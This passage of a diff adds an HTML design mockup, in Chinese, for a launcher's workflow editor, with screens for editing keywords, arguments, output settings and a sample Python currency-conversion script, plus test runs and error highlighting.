+<p class="sub">把「打开 workflow.json 和脚本文件去改」换成一个专门的编辑器窗口：左边选工作流，上方一条流程（关键字 → 输入 → 脚本 → 输出），中间按步骤编辑，右边随时测试运行。⑩–⑫ 是 AI 助手：一句话生成工作流、在编辑器里让 AI 改、测试失败后让 AI 修。配套方案：<code>docs/design/ask-workflow-editor.md</code>。地址加 <code>?light=1</code> 看浅色。</p>
+
+<!-- ① overview: script step -->
+<div class="stage" id="overview"><div class="label">① 编辑器总览：选中「脚本」，右侧测试运行成功</div>
+<div class="ewin">
+  <div class="tool">
+    <div class="lights"><i></i><i></i><i></i></div>
+    <span class="wtile fx">¥</span>
+    <div class="ttl"><b>汇率换算</b><span>local.fx · 1.0.0</span></div>
+    <span class="badge rt">Python</span><span class="badge ok">✓ 可以运行</span>
+    <span class="grow"></span>
+    <span class="saved"><span class="dot"></span>main.py 未保存</span>
+    <span class="btn">保存 <span class="k">⌘S</span></span>
+    <span class="btn p">▶ 测试运行 <span class="k">⌘R</span></span>
+    <span class="btn ghost">···</span>
+    <span class="sw"></span>
+  </div>
+  <div class="ebody">
+    <div class="side">
+      <div class="search">⌕ 搜索工作流</div>
+      <div class="sgrp">我的工作流 · 4</div>
+      <div class="wi on"><span class="wtile sm fx">¥</span><div><div class="n">汇率换算</div><div class="k2">fx</div></div><span class="st ok"></span></div>
+      <div class="files">
+        <div class="fi">⚙︎ 配置 <span style="color:var(--text-3);margin-left:auto">workflow.json</span></div>
+        <div class="fi on">🐍 main.py <span class="m">●</span></div>
+        <div class="fi">📄 README.md</div>
+      </div>
+      <div class="wi"><span class="wtile sm md">MD</span><div><div class="n">Markdown 转 HTML</div><div class="k2">md</div></div><span class="st ok"></span></div>
+      <div class="wi"><span class="wtile sm code">TS</span><div><div class="n">打开项目</div><div class="k2">code</div></div><span class="st bad"></span></div>
+      <div class="wi"><span class="wtile sm jira">J</span><div><div class="n">Jira</div><div class="k2">jira · jm</div></div><span class="st warn"></span></div>
+      <div class="sidefoot"><span class="btn">＋ 新建</span><span class="btn ghost">导入…</span></div>
+    </div>
+    <div class="center">
+      <div class="flow">
+        <div class="node"><div class="nl">⌨︎ 关键字</div><div class="nv"><span class="chip">fx</span><span style="color:var(--text-3)">汇率</span></div></div>
+        <div class="arrow">→</div>
+        <div class="node"><div class="nl">❝ 输入</div><div class="nv">可选 · 或选中文字</div></div>
+        <div class="arrow">→</div>
+        <div class="node on"><div class="nl">▶︎ 脚本</div><div class="nv"><span class="mono">main.py</span> <span class="chip tok">{query}</span></div></div>
+        <div class="arrow">→</div>
+        <div class="node"><div class="nl">⇥ 输出</div><div class="nv">文本 · 10 秒</div></div>
+      </div>
+      <div class="ctabs">
+        <span class="ctab on">main.py <span class="m"></span></span>
+        <span class="ctab">README.md</span>
+        <span class="r"><span class="btn ghost">⌕ 查找</span><span class="btn ghost">用外部编辑器打开</span></span>
+      </div>
+      <div class="codewrap">
+        <div class="gut">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22</div>
+        <div class="src"><span class="ln"><span class="cm">#!/usr/bin/env python3</span></span><span class="ln"><span class="cm"># fx: convert an amount between currencies, e.g. "fx 100 usd jpy".</span></span><span class="ln"><span class="kw1">import</span> json, sys, urllib.request</span><span class="ln"> </span><span class="ln">query = sys.argv[<span class="num">1</span>] <span class="kw1">if</span> <span class="fn">len</span>(sys.argv) &gt; <span class="num">1</span> <span class="kw1">else</span> <span class="str">""</span></span><span class="ln">parts = query.split()</span><span class="ln">amount = <span class="fn">float</span>(parts[<span class="num">0</span>]) <span class="kw1">if</span> parts <span class="kw1">else</span> <span class="num">1</span></span><span class="ln">base = (parts[<span class="num">1</span>] <span class="kw1">if</span> <span class="fn">len</span>(parts) &gt; <span class="num">1</span> <span class="kw1">else</span> <span class="str">"usd"</span>).upper()</span><span class="ln">target = (parts[<span class="num">2</span>] <span class="kw1">if</span> <span class="fn">len</span>(parts) &gt; <span class="num">2</span> <span class="kw1">else</span> <span class="str">"cny"</span>).upper()</span><span class="ln"> </span><span class="ln">url = <span class="str">f"https://api.frankfurter.app/latest?from={base}&amp;to={target}"</span></span><span class="ln cur">rates = json.load(urllib.request.urlopen(url, timeout=<span class="num">5</span>))[<span class="str">"rates"</span>]<span class="caret"></span></span><span class="ln"><span class="kw1">if</span> target <span class="kw1">not in</span> rates:</span><span class="ln">    <span class="fn">print</span>(json.dumps({<span class="str">"error"</span>: <span class="str">f"Unknown currency: {target}"</span>}))</span><span class="ln">    sys.exit(<span class="num">1</span>)</span><span class="ln">rate = rates[target]</span><span class="ln"> </span><span class="ln"><span class="fn">print</span>(<span class="str">f"{amount:g} {base} = {amount * rate:,.2f} {target}"</span>)</span><span class="ln"><span class="fn">print</span>(<span class="str">f"1 {base} = {rate} {target}"</span>)</span><span class="ln"> </span></div>
+      </div>
+      <div class="sbar"><span class="okt">✓ 没有问题</span><span>Python 3.12 · /opt/homebrew/bin/python3</span><span class="r"><span>第 12 行，第 74 列</span><span>UTF-8 · LF · 空格 4</span></span></div>
+    </div>
+    <div class="test">
+      <div class="thd">测试运行<span class="badge dim" style="margin-left:auto">和启动器同一个运行器</span></div>
+      <div class="fld"><div class="k">输入 <span class="chip">fx</span> 后面的内容</div><div class="inp focus">100 usd jpy</div></div>
+      <div class="fld"><div class="k"><span class="chk"></span>带上示例选中文字</div></div>
+      <div class="ttabs"><span class="on">预览</span><span>stdout</span><span>stderr</span><span>传入了什么</span></div>
+      <div class="tres">
+        <div class="meta"><span class="okt">✓ 退出码 0</span>· 0.62 秒 · 2 行输出<span style="margin-left:auto">刚刚</span></div>
+        <div class="mini">
+          <div class="in"><span class="kwc"><span class="g">fx</span>汇率换算</span>100 usd jpy</div>
+          <div class="hr"></div>
+          <div class="rc"><div class="rh"><b>汇率换算</b><span style="margin-left:auto">工作流</span></div>
+            <div class="bd">100 USD = 14,912.30 JPY<br><span class="s2">1 USD = 149.123 JPY</span></div>
+            <div class="acts"><span class="act p">↩ 复制</span><span class="act">⌥↩ 写回</span><span class="act">⌘R 重跑</span><span class="act">⌘↩ 问 AI</span></div>
+          </div>
+        </div>
+      </div>
+      <div class="hist"><div class="h">最近运行</div>
+        <div class="hr2"><span class="okt" style="color:var(--ok)">✓</span><span class="q">测试 · 100 usd jpy</span><span>0.62 s</span><span>刚刚</span></div>
+        <div class="hr2"><span style="color:var(--danger)">✕</span><span class="q">测试 · 100 usd xyz</span><span>0.48 s</span><span>2 分钟前</span></div>
+        <div class="hr2"><span style="color:var(--ok)">✓</span><span class="q">启动器 · fx</span><span>0.55 s</span><span>今天 10:12</span></div>
+      </div>
+    </div>
+  </div>
+</div></div>
+<div class="notes"><h2>一个窗口里写、试、改</h2><ul>
+<li><b>独立窗口</b>，不再塞在设置的一行里。左边是全部工作流（状态点：绿=可以运行，黄=需要确认，红=有错误，灰=已停用），选中后展开它的文件。</li>
+<li>上方的<b>流程条</b>就是这个工作流做的四件事，每一步显示当前配置的摘要，点哪一步就在下面编辑哪一步；有问题的步骤带红点。不用记 <code>workflow.json</code> 的字段名。</li>
+<li>「脚本」步骤是内置代码编辑区：行号、按语言着色、自动缩进、查找替换（系统自带的查找栏）、撤销。仍然可以「用外部编辑器打开」，外部保存后这里自动刷新。</li>
+<li>右侧<b>测试运行</b>：⌘R 先保存再运行，和启动器走同一个运行器、同一套干净环境；预览区就是启动器里会看到的卡片。</li>
+</ul></div>
+
+<!-- ② keywords + input -->
+<div class="stage" id="input"><div class="label">② 「关键字」和「输入」：表格改关键字，参数用占位符拼，下面实时显示脚本会收到什么</div>
+<div class="ewin">
+  <div class="tool">
+    <div class="lights"><i></i><i></i><i></i></div>
+    <span class="wtile fx">¥</span><div class="ttl"><b>汇率换算</b><span>local.fx · 1.0.0</span></div>
+    <span class="badge rt">Python</span><span class="badge bad">1 个问题</span>
+    <span class="grow"></span><span class="saved"><span class="dot"></span>配置未保存</span>
+    <span class="btn">保存 <span class="k">⌘S</span></span><span class="btn p">▶ 测试运行 <span class="k">⌘R</span></span><span class="btn ghost">···</span><span class="sw"></span>
+  </div>
+  <div class="ebody notest">
+    <div class="side">
+      <div class="search">⌕ 搜索工作流</div>
+      <div class="sgrp">我的工作流 · 4</div>
+      <div class="wi on"><span class="wtile sm fx">¥</span><div><div class="n">汇率换算</div><div class="k2">fx · rate</div></div><span class="st bad"></span></div>
+      <div class="files"><div class="fi on">⚙︎ 配置 <span class="m">●</span></div><div class="fi">🐍 main.py</div><div class="fi">📄 README.md</div></div>
+      <div class="wi"><span class="wtile sm md">MD</span><div><div class="n">Markdown 转 HTML</div><div class="k2">md</div></div><span class="st ok"></span></div>
+      <div class="wi"><span class="wtile sm code">TS</span><div><div class="n">打开项目</div><div class="k2">code</div></div><span class="st bad"></span></div>
+      <div class="wi"><span class="wtile sm jira">J</span><div><div class="n">Jira</div><div class="k2">jira · jm</div></div><span class="st warn"></span></div>
+      <div class="sidefoot"><span class="btn">＋ 新建</span><span class="btn ghost">导入…</span></div>
+    </div>
+    <div class="center">
+      <div class="flow">
+        <div class="node on err"><div class="nl">⌨︎ 关键字</div><div class="nv"><span class="chip">fx</span><span class="chip bad">tr</span><span class="chip">rate</span></div></div>
+        <div class="arrow">→</div>
+        <div class="node"><div class="nl">❝ 输入</div><div class="nv">可选 · 或选中文字</div></div>
+        <div class="arrow">→</div>
+        <div class="node"><div class="nl">▶︎ 脚本</div><div class="nv"><span class="mono">main.py</span> <span class="chip tok">{query}</span> <span class="chip tok">…</span></div></div>
+        <div class="arrow">→</div>
+        <div class="node"><div class="nl">⇥ 输出</div><div class="nv">文本 · 10 秒</div></div>
+      </div>
+      <div class="ctabs"><span class="ctab on">表单</span><span class="ctab">workflow.json</span><span class="r"><span style="font-size:11px;color:var(--text-3)">两边同步，改哪边都行</span></span></div>
+      <div class="form">
+        <div class="fsec"><h4>关键字</h4><div class="hint">在启动器里输入关键字加空格就会进入这个工作流。每个关键字可以带预设参数，脚本里用 <span class="chip tok">{option:名字}</span> 或 <code>TYPEFLUX_OPTION_名字</code> 读取。</div>
+          <div class="tbl">
+            <div class="tr h"><span>关键字</span><span>显示名称</span><span>预设参数</span><span></span></div>
+            <div class="tr"><span class="ed mono">fx</span><span class="ed">汇率</span><span class="ed mono"><span class="ph">没有</span></span><span style="color:var(--text-3)">⋮⋮ ✕</span></div>
+            <div class="tr badrow"><span class="ed mono bad">tr</span><span class="ed">换成人民币</span><span class="ed mono">to = cny</span><span style="color:var(--text-3)">⋮⋮ ✕</span></div>
+            <div class="rowerr">「tr」已经被内置的「翻译」使用。换一个，或者在启动器关键字设置里先改掉翻译的。</div>
+            <div class="tr"><span class="ed mono">rate</span><span class="ed">汇率表</span><span class="ed mono">to = usd,eur,jpy</span><span style="color:var(--text-3)">⋮⋮ ✕</span></div>
+          </div>
+          <span class="add">＋ 添加关键字</span>
+        </div>
+        <div class="grid2f">
+          <div class="fsec"><h4>参数</h4><div class="hint">关键字后面输入的内容。</div>
+            <div class="opts" style="grid-template-columns:repeat(3,1fr)">
+              <div class="opt"><div class="ot"><span class="radio"></span>必填</div><div class="od">没有参数不能运行</div></div>
+              <div class="opt on"><div class="ot"><span class="radio on"></span>可选</div><div class="od">可以只输关键字</div></div>
+              <div class="opt"><div class="ot"><span class="radio"></span>不需要</div><div class="od">如 <code>ip</code></div></div>
+            </div></div>
+          <div class="fsec"><h4>选中的文字</h4><div class="hint">只在按 ↩ 之后才交给脚本。</div>
+            <div class="opts">
+              <div class="opt on"><div class="ot"><span class="radio on"></span>没参数时用</div><div class="od">默认</div></div>
+              <div class="opt"><div class="ot"><span class="radio"></span>总是带上</div><div class="od">两者都给</div></div>
+              <div class="opt"><div class="ot"><span class="radio"></span>不要</div><div class="od">从不传</div></div>
+            </div></div>
+        </div>
+        <div class="fsec"><h4>传给脚本的参数</h4><div class="hint">每一格是一个独立参数（argv），不经过 shell，内容里有空格、引号也原样到达。点下面的占位符插入。</div>
+          <div class="argv"><span class="bin">python3 main.py</span><span class="slot"><span class="i">$1</span>{query}</span><span class="slot"><span class="i">$2</span>--to</span><span class="slot"><span class="i">$3</span>{option:to}</span><span class="add" style="margin:0 0 0 4px">＋</span></div>
+          <div class="tokbar">插入：<span class="chip tok">{query}</span><span class="chip tok">{selection}</span><span class="chip tok">{option:to}</span><span style="margin-left:auto">示例：用 <span class="chip">tr</span> 输入 <code>100 usd</code></span></div>
+          <div class="preview">argv  <b>["100 usd", "--to", "cny"]</b><br>stdin <b>{"typeflux":1,"query":"100 usd","keyword":"tr","options":{"to":"cny"},…}</b></div>
+        </div>
+      </div>
+      <div class="sbar"><span class="e">✕ 1 个问题：keywords[1] 与内置关键字冲突</span><span class="r"><span>点击问题可跳到对应位置</span></span></div>
+    </div>
+  </div>
+</div></div>
+<div class="notes"><h2>用表单代替记字段</h2><ul>
+<li>关键字表格可以拖动排序；重名在输入时就校验（和内置插件、其他工作流放在同一个命名空间），错误写在那一行下面，而不是保存后才在列表里出现。</li>
+<li>参数模板做成「格子」：每格一个 argv，占位符点一下插入，不让用户自己拼引号。下面实时显示脚本会收到的 argv 和 stdin。</li>
+<li>「表单」和「workflow.json」两个视图双向同步：表单只改它认识的字段，清单里的其他字段（以后的新字段、作者自己加的字段）原样保留。</li>
+</ul></div>
+
+<!-- ③ output -->
+<div class="stage" id="output"><div class="label">③ 「输出」：选结果类型，旁边直接看启动器里长什么样</div>
+<div class="ewin">
+  <div class="tool">
+    <div class="lights"><i></i><i></i><i></i></div>
+    <span class="wtile fx">¥</span><div class="ttl"><b>汇率换算</b><span>local.fx · 1.0.0</span></div>
+    <span class="badge rt">Python</span><span class="badge ok">✓ 可以运行</span>
+    <span class="grow"></span><span class="saved">已保存</span>
+    <span class="btn">保存 <span class="k">⌘S</span></span><span class="btn p">▶ 测试运行 <span class="k">⌘R</span></span><span class="btn ghost">···</span><span class="sw"></span>
+  </div>
+  <div class="ebody notest">
+    <div class="side">
+      <div class="search">⌕ 搜索工作流</div>
+      <div class="sgrp">我的工作流 · 4</div>
+      <div class="wi on"><span class="wtile sm fx">¥</span><div><div class="n">汇率换算</div><div class="k2">fx · rate</div></div><span class="st ok"></span></div>
+      <div class="files"><div class="fi on">⚙︎ 配置</div><div class="fi">🐍 main.py</div><div class="fi">📄 README.md</div></div>
+      <div class="wi"><span class="wtile sm md">MD</span><div><div class="n">Markdown 转 HTML</div><div class="k2">md</div></div><span class="st ok"></span></div>
+      <div class="wi"><span class="wtile sm code">TS</span><div><div class="n">打开项目</div><div class="k2">code</div></div><span class="st bad"></span></div>
+      <div class="wi"><span class="wtile sm jira">J</span><div><div class="n">Jira</div><div class="k2">jira · jm</div></div><span class="st warn"></span></div>
+      <div class="sidefoot"><span class="btn">＋ 新建</span><span class="btn ghost">导入…</span></div>
+    </div>
+    <div class="center">
+      <div class="flow">
+        <div class="node"><div class="nl">⌨︎ 关键字</div><div class="nv"><span class="chip">fx</span><span class="chip">rate</span></div></div>
+        <div class="arrow">→</div>
+        <div class="node"><div class="nl">❝ 输入</div><div class="nv">可选 · 或选中文字</div></div>
+        <div class="arrow">→</div>
+        <div class="node"><div class="nl">▶︎ 脚本</div><div class="nv"><span class="mono">main.py</span> <span class="chip tok">{query}</span></div></div>
+        <div class="arrow">→</div>
+        <div class="node on"><div class="nl">⇥ 输出</div><div class="nv">文本 · 10 秒</div></div>
+      </div>
+      <div class="ctabs"><span class="ctab on">表单</span><span class="ctab">workflow.json</span></div>
+      <div class="form" style="display:grid;grid-template-columns:1fr 330px;gap:22px">
+        <div>
+          <div class="fsec"><h4>脚本输出什么</h4><div class="hint">决定启动器怎么展示 stdout。</div>
+            <div class="opts" style="grid-template-columns:1fr 1fr">
+              <div class="opt on"><div class="ot"><span class="radio on"></span>文本</div><div class="od">打印的内容逐行显示在卡片里；↩ 复制，⌥↩ 写回。</div></div>
+              <div class="opt"><div class="ot"><span class="radio"></span>不输出，只做事</div><div class="od">运行完启动器关闭；出错时显示错误。</div></div>
+              <div class="opt"><div class="ot"><span class="radio"></span>自动</div><div class="od">是 <code>{"items": …}</code> 就当列表，否则当文本。</div></div>
+              <div class="opt dis"><div class="ot"><span class="radio"></span>条目列表 <span class="soon">W2</span></div><div class="od">打印 JSON 条目，兼容 Alfred Script Filter。</div></div>
+            </div></div>
+          <div class="fsec"><h4>什么时候运行</h4>
+            <div class="opts" style="grid-template-columns:1fr 1fr">
+              <div class="opt on"><div class="ot"><span class="radio on"></span>按 ↩ 运行</div><div class="od">默认。</div></div>
+              <div class="opt dis"><div class="ot"><span class="radio"></span>边打边出 <span class="soon">W2</span></div><div class="od">每次按键都运行，只传参数，限时 3 秒。</div></div>
+            </div></div>
+          <div class="fsec"><h4>限制</h4>
+            <div class="kv"><span class="k">超时</span><div style="display:flex;align-items:center;gap:12px"><div class="slider"></div><span class="inp" style="width:84px">10 秒</span></div>
+              <span class="k">运行时</span><div style="display:flex;gap:8px;align-items:center"><span class="inp" style="width:150px">Python ⌄</span><span class="inp mono" style="flex:1;font-size:11.5px"><span class="ph">解释器：自动（/opt/homebrew/bin/python3）</span></span></div>
+              <span class="k">环境变量</span><div style="display:flex;gap:8px;align-items:center"><span class="inp mono" style="flex:1;font-size:11.5px">FX_PROVIDER = frankfurter</span><span class="add" style="margin:0">＋</span></div>
+            </div></div>
+        </div>
+        <div>
+          <div class="fsec"><h4>启动器里的样子</h4><div class="hint">用上次测试运行的输出；没运行过就用示例。</div>
+            <div class="mini">
+              <div class="in"><span class="kwc"><span class="g">fx</span>汇率换算</span>100 usd jpy</div><div class="hr"></div>
+              <div class="rc"><div class="rh"><b>汇率换算</b><span style="margin-left:auto">工作流</span></div>
+                <div class="bd">100 USD = 14,912.30 JPY<br><span class="s2">1 USD = 149.123 JPY</span></div>
+                <div class="acts"><span class="act p">↩ 复制</span><span class="act">⌥↩ 写回</span><span class="act">⌘R 重跑</span></div></div>
+            </div>
+            <div class="hint" style="margin-top:12px">选「不输出，只做事」时这里显示：启动器关闭，底栏提示「已完成」。</div>
+          </div>
+        </div>
+      </div>
+      <div class="sbar"><span class="okt">✓ 没有问题</span><span class="r"><span>~/Library/Application Support/Typeflux/Workflows/local.fx</span></span></div>
+    </div>
+  </div>
+</div></div>
+<div class="notes"><h2>选了什么就看到什么</h2><ul>
+<li>每个选项都写清楚在启动器里的效果，右边按当前选择即时渲染预览（文本卡片 / 关闭启动器）。</li>
+<li>W2 才支持的条目列表和边打边出先显示为不可选并标 <span class="soon">W2</span>，和现有校验保持一致（选了会报错）。</li>
+<li>运行时、解释器、环境变量也在这一步；解释器默认显示自动找到的路径，找不到时这里直接提示怎么安装。</li>
+</ul></div>
+
+<!-- ④ failure -->
+<div class="stage" id="failure"><div class="label">④ 测试运行失败：错误定位到代码行，stderr 里的行号可以点</div>
+<div class="ewin">
+  <div class="tool">
+    <div class="lights"><i></i><i></i><i></i></div>
+    <span class="wtile fx">¥</span><div class="ttl"><b>汇率换算</b><span>local.fx · 1.0.0</span></div>
+    <span class="badge rt">Python</span><span class="badge ok">✓ 可以运行</span>
+    <span class="grow"></span><span class="saved">已保存</span>
+    <span class="btn">保存 <span class="k">⌘S</span></span><span class="btn p">▶ 测试运行 <span class="k">⌘R</span></span><span class="btn ghost">···</span><span class="sw"></span>
+  </div>
+  <div class="ebody">
+    <div class="side">
+      <div class="search">⌕ 搜索工作流</div>
+      <div class="sgrp">我的工作流 · 4</div>
+      <div class="wi on"><span class="wtile sm fx">¥</span><div><div class="n">汇率换算</div><div class="k2">fx</div></div><span class="st ok"></span></div>
+      <div class="files"><div class="fi">⚙︎ 配置</div><div class="fi on">🐍 main.py</div><div class="fi">📄 README.md</div></div>
+      <div class="wi"><span class="wtile sm md">MD</span><div><div class="n">Markdown 转 HTML</div><div class="k2">md</div></div><span class="st ok"></span></div>
+      <div class="wi"><span class="wtile sm code">TS</span><div><div class="n">打开项目</div><div class="k2">code</div></div><span class="st bad"></span></div>
+      <div class="wi"><span class="wtile sm jira">J</span><div><div class="n">Jira</div><div class="k2">jira · jm</div></div><span class="st warn"></span></div>
+      <div class="sidefoot"><span class="btn">＋ 新建</span><span class="btn ghost">导入…</span></div>
+    </div>
+    <div class="center">
+      <div class="flow">
+        <div class="node"><div class="nl">⌨︎ 关键字</div><div class="nv"><span class="chip">fx</span><span style="color:var(--text-3)">汇率</span></div></div>
+        <div class="arrow">→</div>
+        <div class="node"><div class="nl">❝ 输入</div><div class="nv">可选 · 或选中文字</div></div>
+        <div class="arrow">→</div>
+        <div class="node on"><div class="nl">▶︎ 脚本</div><div class="nv"><span class="mono">main.py</span> <span class="chip tok">{query}</span></div></div>
+        <div class="arrow">→</div>
+        <div class="node"><div class="nl">⇥ 输出</div><div class="nv">文本 · 10 秒</div></div>
+      </div>
+      <div class="ctabs"><span class="ctab on">main.py</span><span class="ctab">README.md</span><span class="r"><span class="btn ghost">用外部编辑器打开</span></span></div>
+      <div class="codewrap">
+        <div class="gut">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+<span class="e">● 12</span>
+
+13
+14
+15
+16
+17
+18
+19
+20
+21</div>
+        <div class="src"><span class="ln"><span class="cm">#!/usr/bin/env python3</span></span><span class="ln"><span class="cm"># fx: convert an amount between currencies, e.g. "fx 100 usd jpy".</span></span><span class="ln"><span class="kw1">import</span> json, sys, urllib.request</span><span class="ln"> </span><span class="ln">query = sys.argv[<span class="num">1</span>] <span class="kw1">if</span> <span class="fn">len</span>(sys.argv) &gt; <span class="num">1</span> <span class="kw1">else</span> <span class="str">""</span></span><span class="ln">parts = query.split()</span><span class="ln">amount = <span class="fn">float</span>(parts[<span class="num">0</span>]) <span class="kw1">if</span> parts <span class="kw1">else</span> <span class="num">1</span></span><span class="ln">base = (parts[<span class="num">1</span>] <span class="kw1">if</span> <span class="fn">len</span>(parts) &gt; <span class="num">1</span> <span class="kw1">else</span> <span class="str">"usd"</span>).upper()</span><span class="ln">target = (parts[<span class="num">2</span>] <span class="kw1">if</span> <span class="fn">len</span>(parts) &gt; <span class="num">2</span> <span class="kw1">else</span> <span class="str">"cny"</span>).upper()</span><span class="ln"> </span><span class="ln">url = <span class="str">f"https://api.frankfurter.app/latest?from={base}&amp;to={target}"</span></span><span class="ln errl">rate = json.load(urllib.request.urlopen(url, timeout=<span class="num">5</span>))[<span class="str">"rates"</span>]<span class="sq">[target]</span></span><span class="diag"><span class="ann">↳ KeyError: 'XYZ' · 测试运行</span></span><span class="ln"> </span><span class="ln"><span class="fn">print</span>(<span class="str">f"{amount:g} {base} = {amount * rate:,.2f} {target}"</span>)</span><span class="ln"><span class="fn">print</span>(<span class="str">f"1 {base} = {rate} {target}"</span>)</span><span class="ln"> </span></div>
+      </div>
+      <div class="sbar"><span class="e">✕ 测试运行失败：退出码 1</span><span class="r"><span>第 12 行</span><span>UTF-8 · LF · 空格 4</span></span></div>
+    </div>
+    <div class="test">
+      <div class="thd">测试运行<span class="badge dim" style="margin-left:auto">和启动器同一个运行器</span></div>
+      <div class="fld"><div class="k">输入 <span class="chip">fx</span> 后面的内容</div><div class="inp">100 usd xyz</div></div>
+      <div class="fld"><div class="k"><span class="chk"></span>带上示例选中文字</div></div>
+      <div class="ttabs"><span>预览</span><span>stdout</span><span class="on">stderr<span class="cnt">4</span></span><span>传入了什么</span></div>
+      <div class="tres">
+        <div class="meta"><span class="e">✕ 退出码 1</span>· 0.48 秒<span style="margin-left:auto">刚刚</span></div>
+        <div class="log">Traceback (most recent call last):
+  File "<span class="lk">main.py", line 12</span>, in &lt;module&gt;
+    rate = json.load(…)["rates"][target]
+<span class="e">KeyError: 'XYZ'</span></div>
+        <div class="meta" style="margin-top:12px">启动器里会显示</div>
+        <div class="mini">
+          <div class="rc err"><div class="rh"><b>汇率换算</b><span style="margin-left:auto">工作流</span></div>
+            <div class="errmsg">脚本出错了（退出码 1）</div>
+            <div class="log" style="font-size:10.5px">KeyError: 'XYZ'</div>
+            <div class="acts"><span class="act">⌘E 编辑工作流</span><span class="act">⌘R 重跑</span></div></div>
+        </div>
+      </div>
+      <div class="hist"><div class="h">最近运行</div>
+        <div class="hr2"><span style="color:var(--danger)">✕</span><span class="q">测试 · 100 usd xyz</span><span>0.48 s</span><span>刚刚</span></div>
+        <div class="hr2"><span style="color:var(--ok)">✓</span><span class="q">测试 · 100 usd jpy</span><span>0.62 s</span><span>3 分钟前</span></div>
+      </div>
+    </div>
+  </div>
+</div></div>
+<div class="notes"><h2>出错时直接指到哪一行</h2><ul>
+<li>从 stderr 里识别常见格式的「文件 + 行号」（Python Traceback、Node 堆栈、<code>zsh: main.sh:12:</code>、osascript 的 <code>-2741</code> 位置），只认工作流文件夹里的文件，标在行号栏上，并在那一行旁边显示最后一行错误。</li>
+<li>stderr 里的位置可以点，跳到对应文件和行。改完 ⌘R 再跑，标记随之消失。</li>
+<li>同时显示启动器里会看到的错误卡片，以及新增的 <b>⌘E 编辑工作流</b>：在启动器里遇到错误，可以一键打开编辑器到这一行。</li>
+</ul></div>
+
+<!-- ⑤ json source -->
+<div class="stage" id="json"><div class="label">⑤ 「workflow.json」视图：给熟悉清单的人，错误标到字段</div>
+<div class="ewin">
+  <div class="tool">
+    <div class="lights"><i></i><i></i><i></i></div>
+    <span class="wtile code">TS</span><div class="ttl"><b>打开项目</b><span>local.code · 0.3.0</span></div>
+    <span class="badge rt">TypeScript</span><span class="badge bad">清单有误 · 2 个问题</span>
+    <span class="grow"></span><span class="saved">已保存</span>
+    <span class="btn">保存 <span class="k">⌘S</span></span><span class="btn p" style="opacity:.45">▶ 测试运行 <span class="k">⌘R</span></span><span class="btn ghost">···</span><span class="sw"></span>
+  </div>
+  <div class="ebody notest">
+    <div class="side">
+      <div class="search">⌕ 搜索工作流</div>
+      <div class="sgrp">我的工作流 · 4</div>
+      <div class="wi"><span class="wtile sm fx">¥</span><div><div class="n">汇率换算</div><div class="k2">fx</div></div><span class="st ok"></span></div>
+      <div class="wi"><span class="wtile sm md">MD</span><div><div class="n">Markdown 转 HTML</div><div class="k2">md</div></div><span class="st ok"></span></div>
+      <div class="wi on"><span class="wtile sm code">TS</span><div><div class="n">打开项目</div><div class="k2">code</div></div><span class="st bad"></span></div>
+      <div class="files"><div class="fi on">⚙︎ 配置</div><div class="fi">📘 index.ts</div></div>
+      <div class="wi"><span class="wtile sm jira">J</span><div><div class="n">Jira</div><div class="k2">jira · jm</div></div><span class="st warn"></span></div>
+      <div class="sidefoot"><span class="btn">＋ 新建</span><span class="btn ghost">导入…</span></div>
+    </div>
+    <div class="center">
+      <div class="flow">
+        <div class="node"><div class="nl">⌨︎ 关键字</div><div class="nv"><span class="chip">code</span></div></div>
+        <div class="arrow">→</div>
+        <div class="node"><div class="nl">❝ 输入</div><div class="nv">必填 · 不要选中文字</div></div>
+        <div class="arrow">→</div>
+        <div class="node err"><div class="nl">▶︎ 脚本</div><div class="nv"><span class="mono">main.ts</span> <span class="chip tok">{query}</span></div></div>
+        <div class="arrow">→</div>
+        <div class="node err"><div class="nl">⇥ 输出</div><div class="nv">条目列表</div></div>
+      </div>
+      <div class="ctabs"><span class="ctab">表单</span><span class="ctab on">workflow.json</span><span class="r"><span class="btn ghost">格式化</span></span></div>
+      <div class="codewrap">
+        <div class="gut">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+<span class="e">● 11</span>
+
+12
+<span class="e">● 13</span>
+
+14
+15
+16
+17
+18
+19
+20</div>
+        <div class="src"><span class="ln">{</span><span class="ln">  <span class="fn">"schema"</span>: <span class="num">1</span>,</span><span class="ln">  <span class="fn">"id"</span>: <span class="str">"local.code"</span>,</span><span class="ln">  <span class="fn">"name"</span>: <span class="str">"打开项目"</span>,</span><span class="ln">  <span class="fn">"version"</span>: <span class="str">"0.3.0"</span>,</span><span class="ln">  <span class="fn">"keywords"</span>: [{ <span class="fn">"keyword"</span>: <span class="str">"code"</span>, <span class="fn">"title"</span>: <span class="str">"在 VS Code 打开"</span> }],</span><span class="ln">  <span class="fn">"input"</span>: { <span class="fn">"argument"</span>: <span class="str">"required"</span>, <span class="fn">"selection"</span>: <span class="str">"never"</span> },</span><span class="ln">  <span class="fn">"run"</span>: { <span class="fn">"mode"</span>: <span class="str">"onSubmit"</span>, <span class="fn">"timeoutSeconds"</span>: <span class="num">5</span> },</span><span class="ln">  <span class="fn">"command"</span>: {</span><span class="ln">    <span class="fn">"runtime"</span>: <span class="str">"typescript"</span>,</span><span class="ln errl">    <span class="fn">"script"</span>: <span class="sq"><span class="str">"main.ts"</span></span>,</span><span class="diag"><span class="ann">↳ 找不到 main.ts · 文件夹里有 index.ts　改成 index.ts</span></span><span class="ln">    <span class="fn">"args"</span>: [<span class="str">"{query}"</span>] },</span><span class="ln errl">  <span class="fn">"output"</span>: <span class="sq"><span class="str">"items"</span></span>,</span><span class="diag"><span class="ann">↳ 条目列表在下一个版本支持</span></span><span class="ln">  <span class="fn">"x-roots"</span>: [<span class="str">"~/Code"</span>, <span class="str">"~/Work"</span>]</span><span class="ln">}</span><span class="ln"> </span></div>
+      </div>
+      <div class="sbar"><span class="e">✕ command.script：找不到 main.ts</span><span class="e">✕ output：条目列表在下一个版本支持</span><span class="r"><span>第 11 行</span><span>JSON</span></span></div>
+    </div>
+  </div>
+</div></div>
+<div class="notes"><h2>清单的错误不再只是一行红字</h2><ul>
+<li>JSON 视图按字段路径（<code>command.script</code>、<code>keywords[1]</code>）把校验结果标到对应行，流程条上对应的步骤也变红，状态栏列出全部问题。</li>
+<li>能猜到的就给一键修正：脚本名写错时提示文件夹里实际存在的同类文件。</li>
